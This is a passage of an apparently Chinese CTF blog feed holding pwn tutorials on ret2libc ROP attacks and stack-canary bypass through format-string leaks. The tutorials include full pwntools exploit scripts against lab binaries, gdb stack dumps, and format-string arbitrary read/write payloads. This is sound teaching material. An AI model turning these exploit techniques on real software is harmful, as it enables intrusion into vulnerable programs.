class="line">print(ch)</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.cnblogs.com/gambler/p/9075415.html" target="_blank" rel="noopener">RC4加密算法原理简单理解</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安恒杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP-ret2libc原理及应用</title>
      <link href="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="01-前置知识"><a href="#01-前置知识" class="headerlink" title="01 前置知识"></a>01 前置知识</h3><ul><li><p>获取shell的方式</p><ul><li>序源码自带系统命令函数                               -简单溢出</li><li>可以找到system函数的plt的绝对地址               -ret2text</li><li>利用输入函数，将shellcode写入到程序中        -ret2shellcode</li><li>利用ROPGadget配合int 0x80调用execve        -ret2Syscall</li><li>利用Libc获取system函数的相对位置.               -ret2Libc</li></ul></li><li><p>plt/got概念</p><ul><li>plt表:Procedure Linkage Table程序联动表（内部函数表）</li><li>got表:Global Offset Table 全局偏移表（全局函数表）</li><li>下图跳过了_dl_runtime_resolve函数地址重定位的过程，直接展示重定位后的调用。<br>由于Libc的延时绑定机制，只有执行过的函数才会在got表中存下来。</li></ul></li></ul><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122094522330.png" alt></p><h3 id="02-Ret2libc原理"><a href="#02-Ret2libc原理" class="headerlink" title="02 Ret2libc原理"></a>02 Ret2libc原理</h3><p>Libc就是Linux下的C函数库，<strong>ret2libc</strong> 这种攻击方式主要是针对 <strong>动态链接(Dynamic linking)</strong> 编译的程序，因为正常情况下是无法在程序中找到像 <strong>system() 、execve()</strong> 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。因为程序是动态链接生成的，所以在程序运行时会调用 <strong>libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)</strong>，<strong>libc.so</strong> 是    linux 下 C 语言库中的运行库<strong>glibc</strong> 的动态链接版，并且 <strong>libc</strong>.<strong>so</strong> 中包含了大量的可以利用的函数，包括 <strong>system() 、execve()</strong> 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 <strong>system(“/bin/sh”)</strong> 来打开 shell， 如此就只剩下两个问题：</p><blockquote><p>1、找到 system() 函数的地址；</p></blockquote><blockquote><p> 2、在内存中找到 “/bin/sh” 这个字符串的地址。</p></blockquote><ul><li>攻击流程</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、泄露一个ret2libc函数的位置</span><br><span class="line">2、获取libc的版本</span><br><span class="line">3、根据偏移获取shell和sh的位置</span><br><span class="line">4、执行程序获取shell</span><br><span class="line"></span><br><span class="line">libc版本</span><br><span class="line">1、https:&#x2F;&#x2F;libc.blukat.me。  2. LibcSearcher</span><br><span class="line"></span><br><span class="line">1、求libc基地址（函数动态地址-函数偏移量）</span><br><span class="line">2、求其他函数地址（基地址+函数偏移量）</span><br></pre></td></tr></table></figure><h3 id="03-实例分析"><a href="#03-实例分析" class="headerlink" title="03 实例分析"></a>03 实例分析</h3><h4 id="3-1-ret2libc1"><a href="#3-1-ret2libc1" class="headerlink" title="3.1 ret2libc1"></a>3.1 ret2libc1</h4><ul><li>伪代码</li></ul><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100238760.png" alt></p><p>有一个gets函数会有溢出漏洞，程序开启了NX，说明我们在栈中的数据没有执行权限，我们需要使用ROP方式进行绕过，我们使用gdb的pattern进行测试溢出偏移量是112</p><p>接下里我们要做的是执行系统函数system(“/bin/sh”)，来获取系统的权限</p><p>所以我们可以想象我们的payload是：’a’ * 112 + system_plt + 0x0000000 + bin_sh_addr</p><p>我们需要system的plt地址以及字符串/bin/sh的地址</p><p>通过ida知道system的plt地址</p><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100805699.png" alt></p><p>获得/bin/sh的地址：</p><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122100918061.png" alt></p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ret2libc1&#39;)</span><br><span class="line">system_plt_addr &#x3D; 0x08048460</span><br><span class="line">bin_sh_addr &#x3D; 0x08048720</span><br><span class="line">payload &#x3D; flat([&#39;a&#39; * 112 , system_plt_addr , 0x00000000 , bin_sh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="3-2-ret2libc2"><a href="#3-2-ret2libc2" class="headerlink" title="3.2 ret2libc2"></a>3.2 ret2libc2</h4><ul><li>伪代码</li></ul><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122101325253.png" alt></p><ul><li>解题思路</li></ul><p>这道题和第一个题没有太大区别，唯一的区别在于找不到字符串/bin/sh的地址了。所以我们需要重新构造。</p><p>除了在程序中查找/bin/sh的地址，我们也可以直接让用户输入。所以我们可以构造以下payload</p><p>payload = ‘a’ + get_plt + pop_ebx + bin_sh + system_plt + 0x00000000 + bin_sh</p><p>payload里的pop_ebx还是pop eax都无所谓，但我们使用ROPgadget在搜索的时候只能搜到pop ebx；ret</p><p>buf变量的值是bss段的内容，我们使用vmmap就可以看到有w权限的bss,在最末尾-16来保存我们gets输入的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_plt &#x3D; 0x08048490</span><br><span class="line">gets_plt &#x3D; 0x08048460</span><br><span class="line">buf &#x3D; 0x0804a0e4 - 16</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;a&#39; * 112,gets_plt,pop_ebx_addr,buf,system_plt,0x00000000,buf])</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122102521831.png" alt></p><h4 id="3-3-ret2libc3"><a href="#3-3-ret2libc3" class="headerlink" title="3.3 ret2libc3"></a>3.3 ret2libc3</h4><p>发现有gets函数，存在漏洞，使用GDB加载程序:gdb ./ret2libc3</p><p>发现有NX保护，我们使用ROP进行绕过。</p><p>我们可以构造payload = ‘a’ * offset + system_plt+0x00000000 + bin_sh_addr</p><p>发现没有system和/bin/sh，所以我们只能靠自己计算这两个的值了。</p><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li></ul><p>所以我们第一个要做的事情就是判断这个ret2libc3程序依赖的哪个libc，思路如下：</p><p>1、泄露一个ret2libc3函数的位置</p><p>2、获取libc的版本</p><p>3、根据偏移获取shell和sh的位置</p><p>4、执行程序获取shell</p><p>我们知道在Linux的程序中使用了延迟绑定机制，也就是说一个函数在没有执行前，你是不知道它的真实地址是什么的。而这个程序中我们能看到的有printf函数、gets函数。我们通过这两个函数来确定libc的版本。代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2libc3&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;ret2libc3&quot;)</span><br><span class="line">offset &#x3D; 112</span><br><span class="line">#要泄漏的函数的地址</span><br><span class="line">target_func &#x3D; &#39;puts&#39;</span><br><span class="line">#调用puts函数进行打印</span><br><span class="line">puts_func &#x3D; &#39;puts&#39;</span><br><span class="line">puts_plt &#x3D; elf.plt[puts_func]</span><br><span class="line">target_got &#x3D; elf.got[target_func]</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;]</span><br><span class="line">#调用puts函数，打印泄漏函数的got地址，最后返回main函数，在32位程序中调用函数地址的第一个参数就是返回地址，后面的才是参数</span><br><span class="line">payload &#x3D; offset * &#39;a&#39; + p32(puts_plt) + p32(main_addr) + p32(target_got)</span><br><span class="line">#payload &#x3D; flat([offset * &#39;a&#39;,puts_plt,main_addr,puts_got])</span><br><span class="line">p.sendlineafter(&quot;Can you find it !?&quot;,payload)</span><br><span class="line">print hex(u32(p.recv()[0:4]))</span><br></pre></td></tr></table></figure><p>我们看一下结果：确实后12位是不变的，3e0。(一个字符4个字节，3 *4 = 12)</p><p><img src="/2020/03/20/ROP-ret2libc%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200122103407652.png" alt></p><p>最后exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line">ret2libc3 &#x3D; ELF(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line">rop &#x3D; ROP(ret2libc3)</span><br><span class="line">func &#x3D; &#39;puts&#39;</span><br><span class="line">puts_plt &#x3D; ret2libc3.plt[&#39;puts&#39;]</span><br><span class="line">libc_start_main_got &#x3D; ret2libc3.got[func]</span><br><span class="line">main &#x3D; ret2libc3.symbols[&#39;main&#39;]# 获取main函数地址</span><br><span class="line">print &quot;leak libc_start_main_got addr and return to main again&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(&#39;Can you find it !?&#39;, payload)</span><br><span class="line">print &quot;get the related addr&quot;</span><br><span class="line">#获取puts函数运行时的地址</span><br><span class="line">libc_start_main_addr &#x3D; u32(sh.recv()[0:4])</span><br><span class="line">print libc_start_main_addr</span><br><span class="line"># 实例化LibcSearcher对象</span><br><span class="line">libc &#x3D; LibcSearcher(func, libc_start_main_addr)</span><br><span class="line"># 计算libc的初始地址（puts的动态地址-puts的偏移地址）</span><br><span class="line">libcbase &#x3D; libc_start_main_addr - libc.dump(func)</span><br><span class="line"># 计算system地址</span><br><span class="line">system_addr &#x3D; libcbase + libc.dump(&#39;system&#39;)</span><br><span class="line"># 计算&#x2F;bin&#x2F;sh地址</span><br><span class="line">binsh_addr &#x3D; libcbase + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">print &quot;get shell&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ROP-ret2libc原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary保护及突破</title>
      <link href="/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/"/>
      <url>/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-Canary保护原理及绕过"><a href="#0x-01-Canary保护原理及绕过" class="headerlink" title="0x 01 Canary保护原理及绕过"></a>0x 01 Canary保护原理及绕过</h3><p>canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致。通过泄露出canary进行绕过。</p><img src="/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/image-20200119205446678.png" style="zoom:50%;"><h3 id="0x-02-例子分析"><a href="#0x-02-例子分析" class="headerlink" title="0x 02 例子分析"></a>0x 02 例子分析</h3><p>源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0,str,0x50);</span><br><span class="line">    printf(&quot;My name is %s.&quot;); &#x2F;&#x2F;printf期待下一个参数，而我们只传了一个参数，但是printf并不知道。会继续向高地址取四字节当成下一个参数</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编代码：（添加Canary保护编译结果）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x0804849b &lt;+0&gt;:lea    ecx,[esp+0x4]    &#x2F;&#x2F;保护esp，地址中存储的返回地址数据没有变</span><br><span class="line">0x0804849f &lt;+4&gt;:and    esp,0xfffffff0   &#x2F;&#x2F;内存对齐</span><br><span class="line">0x080484a2 &lt;+7&gt;:push   DWORD PTR [ecx-0x4]  &#x2F;&#x2F;保护esp</span><br><span class="line">0x080484a5 &lt;+10&gt;:push   ebp</span><br><span class="line">0x080484a6 &lt;+11&gt;:mov    ebp,esp</span><br><span class="line">0x080484a8 &lt;+13&gt;:push   ecx</span><br><span class="line">0x080484a9 &lt;+14&gt;:sub    esp,0x34</span><br><span class="line">0x080484ac &lt;+17&gt;:mov    eax,gs:0x14   &#x2F;&#x2F;从gs:0x14的位置取出carry，复制给eax寄存器</span><br><span class="line">0x080484b2 &lt;+23&gt;:mov    DWORD PTR [ebp-0xc],eax   &#x2F;&#x2F;插入到ebp前面</span><br><span class="line">0x080484b5 &lt;+26&gt;:xor    eax,eax</span><br><span class="line">0x080484b7 &lt;+28&gt;:sub    esp,0x4</span><br><span class="line">0x080484ba &lt;+31&gt;:push   0x50</span><br><span class="line">0x080484bc &lt;+33&gt;:lea    eax,[ebp-0x2c]</span><br><span class="line">0x080484bf &lt;+36&gt;:push   eax</span><br><span class="line">0x080484c0 &lt;+37&gt;:push   0x0</span><br><span class="line">0x080484c2 &lt;+39&gt;:call   0x8048350 &lt;read@plt&gt;</span><br><span class="line">0x080484c7 &lt;+44&gt;:add    esp,0x10</span><br><span class="line">0x080484ca &lt;+47&gt;:sub    esp,0xc</span><br><span class="line">0x080484cd &lt;+50&gt;:push   0x8048580</span><br><span class="line">0x080484d2 &lt;+55&gt;:call   0x8048360 &lt;printf@plt&gt;</span><br><span class="line">0x080484d7 &lt;+60&gt;:add    esp,0x10</span><br><span class="line">0x080484da &lt;+63&gt;:mov    eax,0x0</span><br><span class="line">0x080484df &lt;+68&gt;:mov    edx,DWORD PTR [ebp-0xc]   &#x2F;&#x2F;取出carry与gs:0x14进行比较</span><br><span class="line">0x080484e2 &lt;+71&gt;:xor    edx,DWORD PTR gs:0x14</span><br><span class="line">0x080484e9 &lt;+78&gt;:je     0x80484f0 &lt;main+85&gt;</span><br><span class="line">0x080484eb &lt;+80&gt;:call   0x8048370 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x080484f0 &lt;+85&gt;:mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">0x080484f3 &lt;+88&gt;:leave  </span><br><span class="line">0x080484f4 &lt;+89&gt;:lea    esp,[ecx-0x4]</span><br><span class="line">0x080484f7 &lt;+92&gt;:ret</span><br></pre></td></tr></table></figure><p>常用输出格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><p>这里需要注意一点，%s和%x的区别，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     Stackframe</span><br><span class="line">+------------------+</span><br><span class="line">|   parameter1     |  &lt;- ESP  (pointer to &quot;%s&quot; or &quot;%x&quot;)</span><br><span class="line">+------------------+</span><br><span class="line">|   0xdeadbeef     |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>  当parameter1为%s的地址时，printf会将0xdeadbeef作为地址，取0xdeadbeef指向的字符串填入%s的位置并输出；当parameter1为%x的地址时，printf会直接将0xdeadbeef填入%x的位置，也就是直接输出0xdeadbeef。</p><ul><li>例子二</li></ul><p>源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">    printf(str);</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，我们需要调试程序，让程序断在printf。查找canary距离printf第一个参数有多远，函数断在printf后栈中数据如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 0x28</span><br><span class="line">0000| 0xffffd620 --&gt; 0xffffd63c (&quot;aaa\n\377\377\377\377&#x2F;&quot;)</span><br><span class="line">0004| 0xffffd624 --&gt; 0xffffd63c (&quot;aaa\n\377\377\377\377&#x2F;&quot;)</span><br><span class="line">0008| 0xffffd628 --&gt; 0x50 (&#39;P&#39;)</span><br><span class="line">0012| 0xffffd62c --&gt; 0x804828a (&quot;__libc_start_main&quot;)</span><br><span class="line">0016| 0xffffd630 --&gt; 0x0 </span><br><span class="line">0020| 0xffffd634 --&gt; 0xffffd6d4 --&gt; 0xb21e8355 </span><br><span class="line">0024| 0xffffd638 --&gt; 0xf7fb5000 --&gt; 0x1b1db0 </span><br><span class="line">0028| 0xffffd63c (&quot;aaa\n\377\377\377\377&#x2F;&quot;)</span><br><span class="line">0032| 0xffffd640 --&gt; 0xffffffff </span><br><span class="line">0036| 0xffffd644 --&gt; 0x2f (&#39;&#x2F;&#39;)</span><br><span class="line">0040| 0xffffd648 --&gt; 0xf7e0fdc8 --&gt; 0x2b76 (&#39;v+&#39;)</span><br><span class="line">0044| 0xffffd64c --&gt; 0xf7fd31b0 --&gt; 0xf7e03000 --&gt; 0x464c457f </span><br><span class="line">0048| 0xffffd650 --&gt; 0x8000 </span><br><span class="line">0052| 0xffffd654 --&gt; 0xf7fb5000 --&gt; 0x1b1db0 </span><br><span class="line">0056| 0xffffd658 --&gt; 0xf7fb3244 --&gt; 0xf7e1b020 (&lt;_IO_check_libio&gt;:)</span><br><span class="line">0060| 0xffffd65c --&gt; 0xc4793000 </span><br><span class="line">0064| 0xffffd660 --&gt; 0x1 </span><br><span class="line">0068| 0xffffd664 --&gt; 0x1 </span><br><span class="line">0072| 0xffffd668 --&gt; 0xffffd688 --&gt; 0x0 </span><br><span class="line">0076| 0xffffd66c --&gt; 0x804857b (&lt;main+33&gt;:mov    eax,0x0)</span><br><span class="line">0080| 0xffffd670 --&gt; 0x1 </span><br><span class="line">0084| 0xffffd674 --&gt; 0xffffd734 --&gt; 0xffffd86b (&quot;&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN&#x2F;02&quot;)</span><br><span class="line">0088| 0xffffd678 --&gt; 0xffffd73c --&gt; 0xffffd882 (&quot;TERM&#x3D;xterm-256color&quot;)</span><br><span class="line">0092| 0xffffd67c --&gt; 0xc4793000 </span><br><span class="line">0096| 0xffffd680 --&gt; 0xf7fb53dc --&gt; 0xf7fb61e0 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>打印输出一下carry的信息的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p $ebp-0xc</span><br><span class="line">$2 &#x3D; (void *) 0xffffd65c</span><br></pre></td></tr></table></figure><p>距离第一个参数有60字节，也就是15个参数的长度，所以要读canary我们的payload为%15x。</p><blockquote><p><strong>1.任意地址读：</strong></p><p>根据先前的知识，我们只需要把最后一个%08x换成%s就可以读取0x61616161地址的数据，注意这个0x61616161是我们可以控制的内容，就是我们输入的前四个字节且这四个字节就是读取的地址。所以，可以通过替换这个payload的前四个字节完成任意地址读。</p><p>这个payload也可以简化为aaaa%7$s，这里的7$的意思就是取printf的第七个参数(0x61616161)，如果这里要用等宽输出的话payload就变成这样了aaaa%7$08x，结果会输出aaaa61616161。</p><p><strong>2.任意地址写：</strong></p><p>我们先了解一下%n的作用。%n是将输出的字符的个数写入到内存中。</p><p>根据上述知识，当payload为aaaa%7$n时，输出的字符数量为4，程序会将4写入0x61616161指向的内存中。如果我们需要写更大的数就得用等宽输出来实现了。假设，我们需要向0x61616161写入100，则payload就变成了aaaa%7$0100n。</p><p>任意地址写还有一个问题就是，如果我们要写一个很大的数，比如要将0x8048320写入0x61616161，这个16进制对应的十进制数为134513440，也就是说需要在输出134513440个字符。不用多想，程序肯定会崩溃。</p><p>如果遇到这种情况怎么办呢？我们可以通过%hn来两字节两字节写入。在上面的例子中，我们将0x8048320拆分为高两字节0x804和低两字节0x8320，将0x804也就是十进制2052写入0x61616161 – 0x61616162；将0x8320也就是十进制33568写入0x61616163 –  0x61616164。分两次写入就可以完成大数的写入了。</p><p>参考：<a href="https://www.anquanke.com/post/id/85203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85203</a></p></blockquote><p>泄露carry数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN# .&#x2F;02</span><br><span class="line">%15$08x</span><br><span class="line">cdb3e300</span><br></pre></td></tr></table></figure><p>分析：0xffffd63c地址是第一个参数数据的实际地址，0xffffd65c是carry的地址，偏移量是32字节，0xffffd668是函数的返回地址，偏移量是12个字节</p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;c&quot;)</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;c&quot;)</span><br><span class="line">shell_addr &#x3D; elf.symbols[&quot;exploit&quot;]</span><br><span class="line">payload &#x3D; &quot;%15$08x&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">ret &#x3D; p.recv()</span><br><span class="line">canary &#x3D; ret[:8]</span><br><span class="line">print canary</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 32</span><br><span class="line">payload +&#x3D; (canary.decode(&quot;hex&quot;))[::-1]   # 小端模式反转</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 12</span><br><span class="line">payload +&#x3D; p32(shell_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>参考资料：<a href="https://blog.csdn.net/ddllrrbb/article/details/88854492" target="_blank" rel="noopener">大小端的判断及转换</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Canary保护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj新春WEB红包题</title>
      <link href="/2020/03/20/buuoj%E6%96%B0%E6%98%A5WEB%E7%BA%A2%E5%8C%85%E9%A2%98/"/>
      <url>/2020/03/20/buuoj%E6%96%B0%E6%98%A5WEB%E7%BA%A2%E5%8C%85%E9%A2%98/</url>
      
